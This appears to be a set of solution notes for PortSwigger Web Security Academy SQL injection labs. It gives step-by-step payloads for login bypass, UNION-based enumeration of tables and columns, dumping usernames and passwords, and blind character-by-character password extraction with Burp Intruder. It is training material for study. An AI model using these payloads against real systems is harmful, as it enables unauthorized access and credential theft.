###### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
URL: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

Endpoint: category

Steps:
```
1. Click on any filter item.
2. Insert the following payload in the url: category=' OR 1=1--
```


###### Lab: SQL injection vulnerability allowing login bypass
URL: https://portswigger.net/web-security/sql-injection/lab-login-bypass

Endpoint: username

Steps:
```
1. Go to login section.
2. Insert the following in the username section: administrator' OR 1=1--
```


###### Lab: SQL injection attack, querying the database type and version on Oracle
URL: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

Endpoint: category

Steps:
```
1. Click on any filter item.
2. Add ' to verify if sql injection exists.
3. Use the Order Clause to check the number of items that are being returned.
	3a. category=Gifts'+ORDER+BY+1--
	Response: Returns products
	3b. category=Gifts'+ORDER+BY+2--
	Response: Returns products
	3c. category=Gifts'+ORDER+BY+3--
	Response: Internal Server Error
4. Now we know that there are 2 items in the query.
5. Check the type of items in the query using:
5a. category=Gifts'+UNION+SELECT+1,1+FROM+dual--
	Response: error
5b. category=Gifts'+UNION+SELECT+'a',1+FROM+dual--
	Response: error
5c. category=Gifts'+UNION+SELECT+'a','a'+FROM+dual--
	Response: error
6.  category='+UNION+SELECT+banner,'b'+FROM+v$version--
	Response: Database version information
```

Note: We need to specify database name in case of oracle server thus we are using dual.
Ref: https://www.techonthenet.com/oracle/questions/version.php


###### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
URL: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
Endpoint: category

Steps:
```
1. Click on any filter item.
2. Add ' to verify if sql injection exists.
3. Use the Order Clause to check the number of items that are being returned.
	3a. category=Gifts'+ORDER+BY+1--
	Response: Returns products
	3b. category=Gifts'+ORDER+BY+2--
	Response: Returns products
	3c. category=Gifts'+ORDER+BY+3--
	Response: Internal server error
4. Now we know that there are 2 items in the query.
5. category=Gifts'+UNION+SELECT+@@VERSION,'a'--+
   Response: Database version information
```

Note: Database name is not necessary in when using UNION SELECT on non-oracle MYSQL.
Ref: https://www.sqlshack.com/how-to-find-sql-server-version/


###### Lab: SQL injection attack, listing the database contents on non-Oracle databases
URL: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
Endpoint: category

Steps:
```
1. Click on any filter item.
2. Add ' to verify if sql injection exists.
3. Use the Order Clause to check the number of items that are being returned.
	3a. category=Gifts'+ORDER+BY+1--
	Response: Returns products
	3b. category=Gifts'+ORDER+BY+2--
	Response: Returns products
	3c. category=Gifts'+ORDER+BY+3--
	Response: Internal server error
4. Now we know that there are 2 items in the query.
5. category='+UNION+SELECT+table_name,'a'+FROM+information_schema.tables--+
   Response: Databases names
6.
category=' UNION SELECT COLUMN_NAME,'a' FROM information_schema.columns WHERE table_name='users_uapnzk'--
Response: All Columns in the database users_eyeiho
7. category=' UNION+SELECT+username_rytsgw,password_ndebvk+FROM+users_uapnzk--
   Response: List of Usernames and passwords
```


Ref: https://dba.stackexchange.com/questions/93919/mysql-list-databases-with-tables
Ref: https://stackoverflow.com/questions/1580450/how-do-i-list-all-the-columns-in-a-table


###### Lab: SQL injection attack, listing the database contents on Oracle
URL: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
Endpoint: category

Steps:
```
1. Click on any filter item.
2. Add ' to verify if sql injection exists.
3. Use the Order Clause to check the number of items that are being returned.
	3a. category=Gifts'+ORDER+BY+1--
	Response: Returns products
	3b. category=Gifts'+ORDER+BY+2--
	Response: Returns products
	3c. category=Gifts'+ORDER+BY+3--
	Response: Internal server error
4. Now we know that there are 2 items in the query.
5. category=Gifts'+UNION+SELECT+'a','a'+FROM+dual+--+
6. category='+UNION+SELECT+TABLE_NAME,'a'+FROM+ALL_TABLES--
   Response: All the Tables
7.
category='+UNION+SELECT+column_name,'a'+FROM+all_tab_columns+WHERE+table_name='USERS_GOQFTH'--+
Response: All the Columns in the table
8. category='+UNION+SELECT+USERNAME_AGRSKD,PASSWORD_RRZEUC+FROM+USERS_GOQFTH--+
   Response: All the data in the table
```

Ref: https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TABLES.html#GUID-6823CD28-0681-468E-950B-966C6F71325D



###### Lab: SQL injection UNION attack, determining the number of columns returned by the query
URL: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
Endpoint: category

Steps:
```
1. Click on any filter item.
2. Add ' to verify if sql injection exists.
3. Use the Order Clause to check the number of items that are being returned.
	3a. category=Gifts'+ORDER+BY+1--
	Response: Returns products
	3b. category=Gifts'+ORDER+BY+2--
	Response: Returns products
	3c. category=Gifts'+ORDER+BY+3--
	Response: Returns products
	3d. category=Gifts'+ORDER+BY+4--
	Response: Internal server error
Alternative:
4. 
	4a. category=Pets'+UNION+SELECT+NULL--+
		Response: Error
	4b. category=Pets'+UNION+SELECT+NULL,NULL--+
		Response: Error
	4c. category=Pets'+UNION+SELECT+NULL,NULL,NULL--+
		Response: Returns Products
```


###### Lab: SQL injection UNION attack, finding a column containing text
URL: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
Endpoint: category

Steps:
```
1. Click on any filter item.
2. Add ' to verify if sql injection exists.
3. Use the Order Clause to check the number of items that are being returned.
	3a. category=Gifts'+ORDER+BY+1--
	Response: Returns products
	3b. category=Gifts'+ORDER+BY+2--
	Response: Returns products
	3c. category=Gifts'+ORDER+BY+3--
	Response: Returns products
	3d. category=Gifts'+ORDER+BY+4--
	Response: Internal server error
Alternative:
4. 
	4a. category=Pets'+UNION+SELECT+NULL--+
		Response: Error
	4b. category=Pets'+UNION+SELECT+NULL,NULL--+
		Response: Error
	4c. category=Pets'+UNION+SELECT+NULL,NULL,NULL--+
		Response: Returns Products
5. Checking the type of each one
	5a. category=Pets'+UNION+SELECT+'a',NULL,NULL--+
		Response: Error
	5b. category=Pets'+UNION+SELECT+NULL,'a',NULL--+
		Response: Response
```


###### Lab: SQL injection UNION attack, retrieving data from other tables
URL: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
Endpoint: category

Steps:
```
1. Click on any filter item.
2. Add ' to verify if sql injection exists.
3. Use the Order Clause to check the number of items that are being returned.
	3a. category=Gifts'+ORDER+BY+1--
	Response: Returns products
	3b. category=Gifts'+ORDER+BY+2--
	Response: Returns products
	3c. category=Gifts'+ORDER+BY+3--
	Response: Internal server error
4.  Use UNION Payload
	4a. category=Gifts' UNION SELECT NULL,NULL--
	4b. category=Gifts' UNION SELECT username,password FROM users--
```


###### Lab: SQL injection UNION attack, retrieving multiple values in a single column
URL: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
Endpoint: category

Steps:
```
1. Click on any filter item.
2. Add ' to verify if sql injection exists.
3. Use the Order Clause to check the number of items that are being returned.
	3a. category=Gifts'+ORDER+BY+1--
	Response: Returns products
	3b. category=Gifts'+ORDER+BY+2--
	Response: Returns products
	3c. category=Gifts'+ORDER+BY+3--
	Response: Internal server error
4.  Use UNION Payload
	4a. category=Gifts' UNION SELECT NULL,NULL--
	4b. category=Gifts' UNION SELECT username,password FROM users--
	4c. category=Lifestyle' UNION SELECT NULL,CONCAT(username, '~', password) FROM users--
```


###### Lab: Blind SQL injection with conditional responses
URL: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
Endpoint: TrackingId

Steps:
```
1. Open Burp Suite
2. Intercept the request and send it to repeater.
3. TrackingId=3EBPs6MjysiXEHuK
   Response: Welcome back will be returned.
4. TrackingId=3EBPs6MjysiXEHuK'
   Response: no welcome back message.
5. TrackingId='+OR+1=1--;
   Response: Welcome back will be returned.
6. So we know that blind sql exists.
7. TrackingId='+AND+1=1--;
   Response: Welcome back will be returned.
8. Check if table 'users' exists
	8a. TrackingId='+AND+(SELECT+'1'+FROM+users+LIMIT+1)='1'--;
		Response: Welcome back will be returned.
9. Check if username 'administrator' exists.
	9a. TrackingId='+AND+(SELECT+'1'+FROM+users+WHERE+username='administrator'+LIMIT+1)='1'--;
10. Check if the password length is greater than 1.
	10a. TrackingId='+AND+(SELECT+1+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>1)='1'--;
11. Check if the password length is 20.
	11a. TrackingId='+AND+(SELECT+1+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)=20)='1'--;
12. Check if the first character is c.
	13a. TrackingId='+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)=20)='c'--;
13. Send it to intruder and run it. so we get all the characters.
	13a. Attack Type: Cluster bomb
	13b. Payload set 1: 1-20
	13c. Payload set 2: a-z and 0-9
```